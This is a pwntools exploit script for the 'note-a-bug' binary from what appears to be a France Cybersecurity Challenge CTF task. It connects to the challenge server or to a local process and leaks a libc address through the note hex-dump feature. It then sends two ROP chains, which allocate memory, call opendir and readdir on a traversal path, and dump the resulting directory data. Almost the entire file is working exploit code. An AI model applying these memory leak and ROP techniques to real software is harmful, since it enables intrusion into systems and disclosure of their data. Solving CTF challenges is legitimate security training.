#!/usr/bin/env python3
# Filename: replay-note_a_bug-4000-1770884573745904.py
import json
import os

from pwn import *

# Set logging level


# Load environment variables
# EXTRA is an array of the flagids for current service and team
HOST = "challenges.france-cybersecurity-challenge.fr"

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
if args.REMOTE:
    io = remote(HOST, 2110)
else:
    io = process(["./note-a-bug", "100"])
    if args.GDB:
        gdb.attach(io)
elf = context.binary = ELF('./note-a-bug')
io.recvuntil(b'[*] Current session: ')
session = io.recv(38).split(b'/')[2]
print(session)
data = io.recvuntil(b'ote\n0. Exit\n>>> ')
io.sendline(b'1')

io.recvuntil(b'[*] Creating note: ')
note = io.recv(31)
print(note)
data = io.recvuntil(b'ontent length: \n')
io.sendline(b'256')
data = io.recvuntil(b'Content: \n')
io.sendline(b'AAAAAAAA')
data = io.recvuntil(b'ote\n0. Exit\n>>> ')
io.sendline(b'2')
data = io.recvuntil(b't filename:\n>>> ')
io.sendline(session+b'/'+note)

if args.REMOTE:
    io.recvuntil(b'[0x000000b0] ')
else:
    io.recvuntil(b'[0x000000a0] 00 00 00 00 00 00 00 00 ')

leak = io.recv(6*3).split(b' ')
gg = b''
for i in leak[::-1]:
    gg+=i
libc = ELF('./libc6_2.36-9+deb12u1_amd64.so')

if args.REMOTE:
    rev=int(gg, 16) - libc.sym._IO_2_1_stdout_
else:
    rev=int(gg, 16) - 0x271ca

print(hex(rev))


io.sendline(b'1')
io.recvuntil(b'[*] Creating note: ')
note = io.recv(31)
io.sendline(b'256')

print(note)
read_string = 0x00000000004013B4
hex_dump = 0x0000000004014FF
csu1 = 0x000000000401A02
csu2 = 0x00000000004019E8 

pl = b'A'*96
pl += p64(0)
pl += p64(0x40135e)
pl += p64(0x20)
pl += p64(rev+libc.sym.malloc)
pl += p64(0x40135e)
pl += p64(rev+0x1d2cc0)
pl += p64(0x40135e+1)
pl += p64(0x40135c)
pl += p64(0x10)*2
pl += p64(hex_dump)
pl += p64(0x40135e+1)
pl += p64(0x0000000004013EC)
pause()
io.sendline(pl)

io.recvuntil(b'[0x00000000] ')

leak2 = io.recv(4*3).split(b' ')
gg2 = b''
for i in leak2[::-1]:
    gg2+=i

rev2=int(gg2, 16) - 0x2c0
print(hex(rev2))

io.sendline(b'256')

pl = b'A'*96
pl += p64(0)
pl += p64(0x40135e)
pl += p64(0x405000-0x100)
pl += p64(0x000000000040135c)
pl += p64(0x100)*2
pl += p64(read_string)
pl += p64(0x40135e)
pl += p64(0x405000-0x100)
pl += p64(rev+libc.sym.opendir)
pl += p64(0x40135e)
pl += p64(rev2+0x2d0)
pl += p64(rev+libc.sym.readdir)
pl += p64(0x40135e)
pl += p64(rev2)
pl += p64(0x40135c)
pl += p64(0x1000)*2
pl += p64(hex_dump)


pause()
io.sendline(pl)
pause()
io.sendline(b'../'+b'YAu4kj47vbSDkqTEf2YttEcK88pXYpf'+b'\0')

io.interactive()


